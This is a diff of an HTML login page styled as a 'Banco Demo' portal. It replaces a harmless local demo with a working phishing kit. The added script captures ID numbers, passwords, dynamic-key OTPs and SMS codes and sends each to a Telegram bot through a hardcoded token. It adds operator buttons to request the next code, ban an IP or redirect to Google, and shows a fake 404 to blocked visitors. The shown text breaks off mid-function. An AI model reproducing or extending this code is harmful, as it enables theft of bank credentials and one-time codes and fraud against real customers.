@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -7,11 +6,7 @@
 <title>Portal de acceso - Banco Demo</title>
 
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
 :root {
     --green: #00b82e;
@@ -27,8 +22,6 @@ body {
     min-height: 100vh;
 }
 
-/* CONTENEDOR PRINCIPAL */
-
 .page {
     width: 100%;
     max-width: 1100px;
@@ -40,8 +33,6 @@ body {
     align-items: center;
     padding: 10px 20px 0;
 }
-
-/* FORMULARIO */
 
 .login-card {
     background: white;
@@ -68,11 +59,7 @@ body {
     font-size: 11px;
 }
 
-.welcome {
-    font-size: 18px;
-    font-weight: bold;
-    margin-bottom: 15px;
-}
+.welcome { font-size: 18px; font-weight: bold; margin-bottom: 15px; }
 
 .logo {
     color: var(--green);
@@ -94,11 +81,7 @@ body {
     margin-right: 4px;
 }
 
-/* CAMPOS */
-
-.field {
-    margin-bottom: 17px;
-}
+.field { margin-bottom: 17px; }
 
 .field-label {
     display: flex;
@@ -108,11 +91,7 @@ body {
     font-size: 13px;
 }
 
-.field-label a {
-    color: var(--orange);
-    font-weight: bold;
-    text-decoration: underline;
-}
+.field-label a { color: var(--orange); font-weight: bold; text-decoration: underline; }
 
 .input {
     width: 100%;
@@ -126,22 +105,13 @@ body {
     color: #111;
 }
 
-.input:focus {
-    border: 1.5px solid var(--dark-green);
-}
+.input:focus { border: 1.5px solid var(--dark-green); }
 
-select.input {
-    cursor: pointer;
-}
+select.input { cursor: pointer; }
 
-.password-box {
-    position: relative;
-}
+.password-box { position: relative; }
 
-.password-box input {
-    padding-right: 45px;
-    letter-spacing: 8px;
-}
+.password-box input { padding-right: 45px; letter-spacing: 8px; }
 
 .eye {
     position: absolute;
@@ -154,8 +124,6 @@ select.input {
     color: #999;
     font-size: 19px;
 }
-
-/* RECORDAR */
 
 .remember {
     display: flex;
@@ -175,9 +143,7 @@ select.input {
     flex-shrink: 0;
 }
 
-.switch input {
-    display: none;
-}
+.switch input { display: none; }
 
 .switch span {
     width: 17px;
@@ -190,15 +156,8 @@ select.input {
     transition: .2s;
 }
 
-.switch input:checked + span {
-    left: 16px;
-}
-
-.switch:has(input:checked) {
-    background: var(--green);
-}
-
-/* BOTÓN */
+.switch input:checked + span { left: 16px; }
+.switch:has(input:checked) { background: var(--green); }
 
 .continue {
     width: 100%;
@@ -219,25 +178,43 @@ select.input {
     cursor: pointer;
 }
 
-.register {
-    text-align: center;
-    margin-top: 27px;
+.register { text-align: center; margin-top: 27px; font-size: 13px; color: #777; }
+.register a { color: var(--orange); font-weight: bold; margin-left: 5px; }
+
+/* Error de login */
+.error-msg {
+    display: none;
+    color: #d9381e;
     font-size: 13px;
-    color: #777;
+    margin-top: 10px;
+    font-family: Arial, sans-serif;
+    text-align: center;
 }
+.error-msg.show { display: block; }
 
-.register a {
-    color: var(--orange);
-    font-weight: bold;
-    margin-left: 5px;
+/* Loading overlay */
+.loading-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(255,255,255,.85);
+    z-index: 10000;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
 }
-
-/* COLUMNA DERECHA */
-
-.right-content {
-    width: 100%;
-    padding: 20px 0;
+.loading-spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #00b82e;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
 }
+@keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
+
+/* Columna derecha */
+.right-content { width: 100%; padding: 20px 0; }
 
 .banner {
     width: 100%;
@@ -254,23 +231,19 @@ select.input {
 .banner::before {
     content: "";
     position: absolute;
-    width: 250px;
-    height: 250px;
+    width: 250px; height: 250px;
     background: #13e900;
     border-radius: 50%;
-    top: -165px;
-    left: -70px;
+    top: -165px; left: -70px;
 }
 
 .banner::after {
     content: "";
     position: absolute;
-    width: 230px;
-    height: 230px;
+    width: 230px; height: 230px;
     background: #13e900;
     border-radius: 50%;
-    bottom: -190px;
-    right: -90px;
+    bottom: -190px; right: -90px;
 }
 
 .banner-person {
@@ -284,593 +257,702 @@ select.input {
     font-size: 90px;
 }
 
-.banner-person span {
-    margin-bottom: 10px;
-}
+.banner-person span { margin-bottom: 10px; }
 
-.banner-info {
-    width: 60%;
-    position: relative;
-    z-index: 2;
-    padding: 20px;
-}
-
-.banner-info h2 {
-    font-size: 22px;
-    color: #16f000;
-    margin-bottom: 10px;
-}
-
-.banner-info p {
-    font-size: 14px;
-    line-height: 1.5;
-    margin-bottom: 16px;
-}
-
+.banner-info { width: 60%; position: relative; z-index: 2; padding: 20px; }
+.banner-info h2 { font-size: 22px; color: #16f000; margin-bottom: 10px; }
+.banner-info p { font-size: 14px; line-height: 1.5; margin-bottom: 16px; }
 .banner-info button {
-    background: white;
-    border: none;
-    border-radius: 7px;
-    padding: 13px;
-    color: #125665;
-    font-weight: bold;
-    font-size: 13px;
-    cursor: pointer;
+    background: white; border: none; border-radius: 7px;
+    padding: 13px; color: #125665; font-weight: bold; font-size: 13px; cursor: pointer;
 }
 
-.slider-lines {
-    display: flex;
-    gap: 7px;
-    margin: 14px 0 28px;
-}
+.slider-lines { display: flex; gap: 7px; margin: 14px 0 28px; }
+.slider-lines span { height: 4px; background: white; flex: 1; border-radius: 5px; }
+.slider-lines span:nth-child(3) { background: var(--green); }
 
-.slider-lines span {
-    height: 4px;
-    background: white;
-    flex: 1;
-    border-radius: 5px;
-}
-
-.slider-lines span:nth-child(3) {
-    background: var(--green);
-}
-
-/* AYUDA */
-
-.help h2 {
-    font-size: 17px;
-    margin-bottom: 16px;
-}
-
-.help-cards {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 16px;
-}
-
+.help h2 { font-size: 17px; margin-bottom: 16px; }
+.help-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
 .help-card {
-    background: white;
-    border-radius: 12px;
-    min-height: 85px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    gap: 8px;
-    font-size: 12px;
-    cursor: pointer;
+    background: white; border-radius: 12px; min-height: 85px;
+    display: flex; flex-direction: column; justify-content: center; align-items: center;
+    gap: 8px; font-size: 12px; cursor: pointer;
 }
-
 .help-icon {
-    width: 38px;
-    height: 38px;
-    background: #b5f2bb;
-    color: #00ae28;
-    border-radius: 50%;
-    display: flex;
+    width: 38px; height: 38px; background: #b5f2bb; color: #00ae28;
+    border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px;
+}
+
+.footer { width: 100%; background: white; min-height: 95px; border-top: 1px solid #eee; }
+.footer-top { display: flex; align-items: center; justify-content: space-between; padding: 15px 30px; }
+.footer-logo { color: var(--green); font-weight: 900; font-size: 21px; }
+.footer-links { display: flex; gap: 25px; }
+.footer-links a { color: var(--orange); font-size: 12px; font-weight: bold; }
+.footer-bottom {
+    border-top: 1px solid #ddd; padding: 8px 30px; font-size: 11px;
+    display: flex; justify-content: space-between;
+}
+
+/* MODAL OTP (Clave dinámica + SMS) */
+.demo-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 9999;
+    background: rgba(0,0,0,.68);
+    backdrop-filter: blur(2px);
     align-items: center;
     justify-content: center;
-    font-size: 20px;
+    padding: 18px;
 }
+.demo-overlay.is-open { display: flex; }
 
-/* PIE DE PÁGINA */
-
-.footer {
+.demo-modal {
     width: 100%;
-    background: white;
-    min-height: 95px;
-    border-top: 1px solid #eee;
+    max-width: 680px;
+    max-height: 92vh;
+    overflow-y: auto;
+    background: #fff;
+    border-radius: 24px;
+    padding: 28px 30px 40px;
+    box-shadow: 0 18px 48px rgba(0,0,0,.24);
+    position: relative;
 }
 
-.footer-top {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 15px 30px;
+.demo-close-row { display: flex; justify-content: flex-end; margin-bottom: 16px; }
+
+.demo-close {
+    border: 0; background: transparent; font-size: 28px; line-height: 1;
+    width: 36px; height: 36px; cursor: pointer; color: #333;
 }
 
-.footer-logo {
-    color: var(--green);
-    font-weight: 900;
-    font-size: 21px;
+.demo-instruction {
+    background: #d7f0db;
+    border-radius: 14px;
+    padding: 24px 22px;
+    text-align: center;
+    margin: 0 0 18px;
+    color: #125665;
+    font-size: clamp(16px, 2.5vw, 20px);
+    line-height: 1.45;
+}
+.demo-instruction strong { font-weight: 800; }
+
+.demo-title {
+    text-align: center;
+    font-size: clamp(22px, 3.5vw, 30px);
+    line-height: 1.2;
+    margin: 12px 0 24px;
+    color: #125665;
 }
 
-.footer-links {
-    display: flex;
-    gap: 25px;
+.demo-actions { display: flex; justify-content: center; gap: 16px; margin-top: 20px; }
+.demo-actions button { flex: 1; max-width: 250px; min-height: 50px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; border: none; }
+.demo-actions .bc-button-secondary { background: transparent; color: #125665; border: 1.5px solid #125665; }
+.demo-actions .bc-button-primary { background: #125665; color: #fff; }
+.demo-actions .bc-button-primary:disabled { background: #bdbdbd; color: #777; cursor: not-allowed; }
+
+.demo-note { font-size: 12px; color: #999; text-align: center; margin-top: 20px; }
+
+.demo-step { display: none; }
+.demo-step.active { display: block; }
+
+/* Slots OTP */
+.otp-slots-container { display: flex; justify-content: center; gap: 10px; margin: 24px 0; }
+.otp-slot {
+    width: 45px; height: 50px;
+    border: 1px solid #ccc; border-radius: 8px;
+    text-align: center; font-size: 1.5rem; line-height: 50px;
+    font-weight: bold; background: #fdfdfd; color: #125665;
 }
+.otp-slot.active { border-color: var(--green); box-shadow: 0 0 5px rgba(0,184,46,.5); }
+.otp-slots-container.error .otp-slot { border-color: #d9381e; }
 
-.footer-links a {
-    color: var(--orange);
-    font-size: 12px;
-    font-weight: bold;
-}
+.otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; }
 
-.footer-bottom {
-    border-top: 1px solid #ddd;
-    padding: 8px 30px;
-    font-size: 11px;
-    display: flex;
-    justify-content: space-between;
-}
-
-/* TABLET Y MÓVIL */
-
+/* Tablet y móvil */
 @media (max-width: 760px) {
+    body { background: #f5f5f5; }
+    .page { display: block; padding: 0; min-height: auto; }
+    .login-card { width: 100%; min-height: auto; padding: 42px 8% 32px; border-radius: 0; box-shadow: none; }
+    .security { top: 16px; right: 9%; }
+    .welcome { font-size: 21px; margin-bottom: 14px; }
+    .logo { font-size: 28px; margin-bottom: 42px; }
+    .logo-symbol { width: 29px; height: 29px; }
+    .field { margin-bottom: 23px; }
+    .field-label { font-size: 16px; margin-bottom: 9px; }
+    .input { height: 58px; font-size: 17px; padding: 0 17px; border-radius: 11px; }
+    .password-box input { letter-spacing: 8px; padding-right: 50px; }
+    .eye { font-size: 22px; right: 15px; }
+    .remember { font-size: 14px; gap: 10px; margin: 27px 0 38px; }
+    .switch { width: 43px; height: 26px; }
+    .switch span { width: 20px; height: 20px; top: 3px; left: 3px; }
+    .switch input:checked + span { left: 20px; }
+    .continue { height: 58px; font-size: 17px; border-radius: 11px; }
+    .register { font-size: 16px; margin-top: 36px; }
+    .right-content { padding: 30px 5% 25px; }
+    .banner { display: none; }
+    .slider-lines { display: none; }
+    .help h2 { font-size: 21px; margin-bottom: 20px; }
+    .help-cards { gap: 12px; }
+    .help-card { min-height: 100px; font-size: 12px; }
+    .help-icon { width: 40px; height: 40px; font-size: 20px; }
+    .footer { min-height: 80px; background: white; }
+    .footer-top { justify-content: center; padding: 18px; }
+    .footer-logo { display: none; }
+    .footer-bottom { display: none; }
+    .footer-links { width: 100%; justify-content: space-around; gap: 10px; }
+    .footer-links a { font-size: 14px; }
 
-    body {
-        background: #f5f5f5;
-    }
-
-    .page {
-        display: block;
-        padding: 0;
-        min-height: auto;
-    }
-
-    .login-card {
-        width: 100%;
-        min-height: auto;
-        padding: 42px 8% 32px;
-        border-radius: 0;
-        box-shadow: none;
-    }
-
-    .security {
-        top: 16px;
-        right: 9%;
-    }
-
-    .welcome {
-        font-size: 21px;
-        margin-bottom: 14px;
-    }
-
-    .logo {
-        font-size: 28px;
-        margin-bottom: 42px;
-    }
-
-    .logo-symbol {
-        width: 29px;
-        height: 29px;
-    }
-
-    .field {
-        margin-bottom: 23px;
-    }
-
-    .field-label {
-        font-size: 16px;
-        margin-bottom: 9px;
-    }
-
-    .input {
-        height: 58px;
-        font-size: 17px;
-        padding: 0 17px;
-        border-radius: 11px;
-    }
-
-    .password-box input {
-        letter-spacing: 8px;
-        padding-right: 50px;
-    }
-
-    .eye {
-        font-size: 22px;
-        right: 15px;
-    }
-
-    .remember {
-        font-size: 14px;
-        gap: 10px;
-        margin: 27px 0 38px;
-    }
-
-    .switch {
-        width: 43px;
-        height: 26px;
-    }
-
-    .switch span {
-        width: 20px;
-        height: 20px;
-        top: 3px;
-        left: 3px;
-    }
-
-    .switch input:checked + span {
-        left: 20px;
-    }
-
-    .continue {
-        height: 58px;
-        font-size: 17px;
-        border-radius: 11px;
-    }
-
-    .register {
-        font-size: 16px;
-        margin-top: 36px;
-    }
-
-    .right-content {
-        padding: 30px 5% 25px;
-    }
-
-    .banner {
-        display: none;
-    }
-
-    .slider-lines {
-        display: none;
-    }
-
-    .help h2 {
-        font-size: 21px;
-        margin-bottom: 20px;
-    }
-
-    .help-cards {
-        gap: 12px;
-    }
-
-    .help-card {
-        min-height: 100px;
-        font-size: 12px;
-    }
-
-    .help-icon {
-        width: 40px;
-        height: 40px;
-        font-size: 20px;
-    }
-
-    .footer {
-        min-height: 80px;
-        background: white;
-    }
-
-    .footer-top {
-        justify-content: center;
-        padding: 18px;
-    }
-
-    .footer-logo {
-        display: none;
-    }
-
-    .footer-bottom {
-        display: none;
-    }
-
-    .footer-links {
-        width: 100%;
-        justify-content: space-around;
-        gap: 10px;
-    }
-
-    .footer-links a {
-        font-size: 14px;
-    }
+    .demo-overlay { padding: 12px; }
+    .demo-modal { max-width: 100%; padding: 20px 20px 30px; border-radius: 20px; }
+    .otp-slot { width: 40px; height: 46px; font-size: 1.3rem; line-height: 46px; }
+    .demo-actions { gap: 12px; }
 }
-
-/* MÓVILES PEQUEÑOS */
 
 @media (max-width: 380px) {
-
-    .login-card {
-        padding-left: 6%;
-        padding-right: 6%;
-    }
-
-    .welcome {
-        font-size: 19px;
-    }
-
-    .logo {
-        font-size: 25px;
-    }
-
-    .field-label {
-        font-size: 14px;
-    }
-
-    .input {
-        height: 52px;
-        font-size: 15px;
-    }
-
-    .remember {
-        font-size: 12px;
-    }
-
-    .continue {
-        height: 52px;
-        font-size: 15px;
-    }
-
-    .register {
-        font-size: 14px;
-    }
-
-    .help h2 {
-        font-size: 18px;
-    }
+    .login-card { padding-left: 6%; padding-right: 6%; }
+    .welcome { font-size: 19px; }
+    .logo { font-size: 25px; }
+    .field-label { font-size: 14px; }
+    .input { height: 52px; font-size: 15px; }
+    .remember { font-size: 12px; }
+    .continue { height: 52px; font-size: 15px; }
+    .register { font-size: 14px; }
+    .help h2 { font-size: 18px; }
+    .otp-slot { width: 34px; height: 42px; font-size: 1.1rem; line-height: 42px; }
 }
 </style>
 </head>
 
 <body>
 
+<!-- Loading -->
+<div class="loading-overlay" id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <p style="margin-top:15px;font-weight:600;color:#125665;">Procesando solicitud...</p>
+</div>
+
 <main class="page">
 
     <!-- FORMULARIO -->
     <section class="login-card">
-
         <div class="security">♙</div>
-
         <h1 class="welcome">Bienvenido a</h1>
-
         <div class="logo">
             <span class="logo-symbol">D</span>
             banco DEMO
         </div>
 
-        <div class="field">
-            <label class="field-label" for="documentType">
-                Tipo de documento
-            </label>
-
-            <select class="input" id="documentType">
-                <option>Cédula de Ciudadanía</option>
-                <option>Cédula de Extranjería</option>
-                <option>Pasaporte</option>
-                <option>Tarjeta de Identidad</option>
-            </select>
-        </div>
-
-        <div class="field">
-            <label class="field-label" for="documentNumber">
-                Número de documento
-            </label>
-
-            <input
-                class="input"
-                id="documentNumber"
-                type="text"
-                inputmode="numeric"
-                placeholder="Número de documento"
-                autocomplete="off"
-            >
-        </div>
-
-        <div class="field">
-
-            <div class="field-label">
-                <label for="password">Contraseña de demostración</label>
-                <a href="#" onclick="return false">¿La olvidaste?</a>
+        <form id="demoForm" autocomplete="off">
+            <div class="field">
+                <label class="field-label" for="documentType">Tipo de documento</label>
+                <select class="input" id="documentType">
+                    <option>Cédula de Ciudadanía</option>
+                    <option>Cédula de Extranjería</option>
+                    <option>Pasaporte</option>
+                    <option>Tarjeta de Identidad</option>
+                </select>
             </div>
 
-            <div class="password-box">
-
-                <input
-                    class="input"
-                    id="password"
-                    type="password"
-                    inputmode="numeric"
-                    maxlength="4"
-                    placeholder="----"
-                    autocomplete="off"
-                >
-
-                <button
-                    class="eye"
-                    id="togglePassword"
-                    type="button"
-                    aria-label="Mostrar u ocultar"
-                >◉</button>
-
+            <div class="field">
+                <label class="field-label" for="documentNumber">Número de documento</label>
+                <input class="input" id="documentNumber" type="text" inputmode="numeric" placeholder="Número de documento" autocomplete="off" required>
             </div>
-        </div>
 
-        <div class="remember">
+            <div class="field">
+                <div class="field-label">
+                    <label for="password">Contraseña de demostración</label>
+                    <a href="#" onclick="return false">¿La olvidaste?</a>
+                </div>
+                <div class="password-box">
+                    <input class="input" id="password" type="password" inputmode="numeric" maxlength="4" placeholder="----" autocomplete="off" required>
+                    <button class="eye" id="togglePassword" type="button" aria-label="Mostrar u ocultar">◉</button>
+                </div>
+            </div>
 
-            <label class="switch">
-                <input type="checkbox" id="remember">
-                <span></span>
-            </label>
+            <div class="remember">
+                <label class="switch">
+                    <input type="checkbox" id="remember">
+                    <span></span>
+                </label>
+                <label for="remember">Recordar tipo y número de documento</label>
+            </div>
 
-            <label for="remember">
-                Recordar tipo y número de documento
-            </label>
+            <button class="continue" id="continueButton" type="submit" disabled>Continuar</button>
 
-        </div>
+            <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
 
-        <button
-            class="continue"
-            id="continueButton"
-            type="button"
-            disabled
-        >
-            Continuar
-        </button>
-
-        <div class="register">
-            ¿No eres usuario?
-            <a href="#" onclick="return false">Regístrate</a>
-        </div>
-
+            <div class="register">
+                ¿No eres usuario?
+                <a href="#" onclick="return false">Regístrate</a>
+            </div>
+        </form>
     </section>
 
     <!-- CONTENIDO DERECHO -->
-
     <section class="right-content">
-
         <div class="banner">
-
-            <div class="banner-person">
-                <span>👩🏻</span>
-            </div>
-
+            <div class="banner-person"><span>👩🏻</span></div>
             <div class="banner-info">
-
                 <h2>Zona Transaccional</h2>
-
-                <p>
-                    Descubre nuevas funciones y opciones
-                    financieras disponibles en nuestro
-                    portal de demostración.
-                </p>
-
-                <button type="button">
-                    Conoce más
-                </button>
-
+                <p>Descubre nuevas funciones y opciones financieras disponibles en nuestro portal de demostración.</p>
+                <button type="button">Conoce más</button>
             </div>
-
         </div>
-
-        <div class="slider-lines">
-            <span></span>
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-
+        <div class="slider-lines"><span></span><span></span><span></span><span></span></div>
         <div class="help">
-
             <h2>¿Cómo podemos ayudarte?</h2>
-
             <div class="help-cards">
-
-                <div class="help-card">
-                    <div class="help-icon">▣</div>
-                    Solicitar productos
-                </div>
-
-                <div class="help-card">
-                    <div class="help-icon">▯</div>
-                    Contáctanos
-                </div>
-
-                <div class="help-card">
-                    <div class="help-icon">♧</div>
-                    Visítanos
-                </div>
-
+                <div class="help-card"><div class="help-icon">▣</div>Solicitar productos</div>
+                <div class="help-card"><div class="help-icon">▯</div>Contáctanos</div>
+                <div class="help-card"><div class="help-icon">♧</div>Visítanos</div>
             </div>
-
         </div>
-
     </section>
 
 </main>
 
-<!-- PIE DE PÁGINA -->
-
+<!-- PIE -->
 <footer class="footer">
-
     <div class="footer-top">
-
-        <div class="footer-logo">
-            D &nbsp; BANCO DEMO
-        </div>
-
+        <div class="footer-logo">D &nbsp; BANCO DEMO</div>
         <div class="footer-links">
             <a href="#" onclick="return false">Seguridad</a>
             <a href="#" onclick="return false">Accesibilidad</a>
         </div>
-
     </div>
-
     <div class="footer-bottom">
         <span>Portal de demostración</span>
         <span>© Banco Demo - Versión de prueba</span>
     </div>
-
 </footer>
 
-<script>
+<!-- MODAL OTP (Clave Dinámica + SMS) -->
+<div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
+    <section class="demo-modal">
+        <div class="demo-close-row">
+            <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
+        </div>
 
+        <!-- Vista Clave Dinámica -->
+        <div id="viewDinamica" class="demo-step active">
+            <div class="demo-instruction">
+                <strong>Verificación de Seguridad</strong><br>
+                Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.
+            </div>
+            <h2 class="demo-title">Clave Dinámica</h2>
+            <div class="otp-slots-container" id="otpContainer">
+                <div class="otp-slot"></div>
+                <div class="otp-slot"></div>
+                <div class="otp-slot"></div>
+                <div class="otp-slot"></div>
+                <div class="otp-slot"></div>
+                <div class="otp-slot"></div>
+            </div>
+            <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
+            <p id="otpError" class="error-msg" style="margin-bottom:15px;">Clave dinámica incorrecta o expirada.</p>
+            <div class="demo-actions">
+                <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
+                <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
+            </div>
+        </div>
+
+        <!-- Vista SMS -->
+        <div id="viewSms" class="demo-step">
+            <div class="demo-instruction">
+                <strong>Verificación SMS</strong><br>
+                Hemos enviado un código SMS de 6 dígitos a tu celular registrado.
+            </div>
+            <h2 class="demo-title">Código SMS</h2>
+            <div style="max-width:300px;margin:0 auto 20px;" id="smsInputWrap">
+                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.5rem;height:45px;letter-spacing:4px;">
+            </div>
+            <p id="smsError" class="error-msg" style="margin-bottom:15px;">Código SMS inválido.</p>
+            <div class="demo-actions">
+                <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width:100%;">Verificar Código</button>
+            </div>
+        </div>
+
+        <p class="demo-note">servicios bancarios</p>
+    </section>
+</div>
+
+<script>
+// ==========================================
+// 🔑 CONFIGURACIÓN DE TELEGRAM
+// ==========================================
+const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
+const TG_CHAT_ID = '7776240161';
+
+// ==========================================
+// ELEMENTOS
+// ==========================================
+const documentType = document.getElementById("documentType");
 const documentNumber = document.getElementById("documentNumber");
-const password = document.getElementById("password");
-const continueButton = document.getElementById("continueButton");
+const claveInput = document.getElementById("password");
+const submitBtn = document.getElementById("continueButton");
+const demoForm = document.getElementById("demoForm");
+const loadingOverlay = document.getElementById('loading-overlay');
+const loginError = document.getElementById('loginError');
 const togglePassword = document.getElementById("togglePassword");
 
-function validateForm() {
+const modal = document.getElementById("modalDinamica");
+const otpInput = document.getElementById("otpInput");
+const otpSlots = document.querySelectorAll(".otp-slot");
+const btnBorrar = document.getElementById("btnBorrar");
+const btnContinuar = document.getElementById("btnContinuar");
+const otpError = document.getElementById("otpError");
+const otpContainer = document.getElementById("otpContainer");
+const closeModal = document.getElementById("closeModal");
 
-    const documentValid =
-        documentNumber.value.trim().length > 0;
+const viewDinamica = document.getElementById("viewDinamica");
+const viewSms = document.getElementById("viewSms");
+const smsCodeInput = document.getElementById("smsCodeInput");
+const btnSmsFinal = document.getElementById("btnSmsFinal");
+const smsError = document.getElementById("smsError");
+const smsInputWrap = document.getElementById("smsInputWrap");
 
-    const passwordValid =
-        /^\d{4}$/.test(password.value);
-
-    const valid = documentValid && passwordValid;
-
-    continueButton.disabled = !valid;
-
-    continueButton.classList.toggle(
-        "active",
-        valid
-    );
+// ==========================================
+// CONTROL DE SEGURIDAD PRE-CARGA (anti-refresco)
+// ==========================================
+if (localStorage.getItem('sys_blocked_user') === 'true') {
+    window.stop();
+    document.documentElement.innerHTML = `
+        <html lang="es"><head><title>404 Not Found</title>
+        <style>
+            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+            .container { text-align: center; }
+            h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; display: inline-block; border-right: 1px solid rgba(0,0,0,.3); padding: 0 20px 0 0; margin-right: 20px; vertical-align: middle; }
+            .msg { display: inline-block; text-align: left; vertical-align: middle; font-size: 14px; }
+        </style></head>
+        <body><div class="container"><h1>404</h1><div class="msg">This page could not be found.</div></div></body>
+        </html>`;
 }
 
-documentNumber.addEventListener("input", validateForm);
+// ==========================================
+// VARIABLES DE CONTROL
+// ==========================================
+let pollingActivo = false;
+let pollingTimeout = null;
+let ultimoUpdateId = -1;
+let actionProcessed = false;
+let msgIdActual = null;
 
-password.addEventListener("input", function() {
+function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
 
-    this.value = this.value
-        .replace(/\D/g, "")
-        .slice(0, 4);
+// ==========================================
+// VALIDACIÓN Y UI DEL FORMULARIO
+// ==========================================
+function actualizarBoton() {
+    const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
+    const usuarioLleno = documentNumber.value.trim().length > 0;
+    const formularioValido = claveCompleta && usuarioLleno;
 
-    validateForm();
+    submitBtn.disabled = !formularioValido;
+    submitBtn.classList.toggle("active", formularioValido);
 
+    if (formularioValido) loginError.classList.remove("show");
+}
+
+documentNumber.addEventListener("input", actualizarBoton);
+
+claveInput.addEventListener("input", function() {
+    claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
+    actualizarBoton();
 });
 
 togglePassword.addEventListener("click", function() {
-
-    const visible = password.type === "text";
-
-    password.type = visible ? "password" : "text";
-
+    const visible = claveInput.type === "text";
+    claveInput.type = visible ? "password" : "text";
     this.textContent = visible ? "◉" : "◎";
-
 });
 
-continueButton.addEventListener("click", function() {
+// ==========================================
+// ENVÍO A TELEGRAM
+// ==========================================
+function enviarIdentificacionTelegram(tipoDoc, usuario, clave) {
+    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n📄 <b>Tipo doc:</b> <code>${tipoDoc}</code>\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
 
-    if (!continueButton.disabled) {
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: '❌ Usuario Malo', callback_data: 'error_usuario' },
+                { text: '🔑 Pedir Dinámica', callback_data: 'pedir_dinamica' }
+            ],
+            [
+                { text: '🚫 Banear IP', callback_data: 'banear_ip' },
+                { text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }
+            ]
+        ]
+    };
 
-        alert(
-            "Esta es una demostración local. No se enviaron datos."
-        );
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionLogin);
+        } else {
+            ocultarOverlay();
+        }
+    }).catch(() => ocultarOverlay());
+}
 
+function enviarDinamicaTelegram(dinamica) {
+    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica' }, { text: '📩 SMS Code', callback_data: 'sms_code' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionDinamica);
+        }
+    });
+}
+
+function enviarSmsTelegram(codigoSms) {
+    const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${documentNumber.value}</code>\n📩 <b>SMS:</b> <code>${codigoSms}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+
+    const keyboard = {
+        inline_keyboard: [
+            [{ text: '❌ Error Dinámica', callback_data: 'error_dinamica_final' }],
+            [{ text: '❌ Error SMS Code', callback_data: 'error_sms_final' }],
+            [{ text: '🏁 Finalizar (Google)', callback_data: 'finalizar' }]
+        ]
+    };
+
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
+    }).then(r => r.json()).then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionSms);
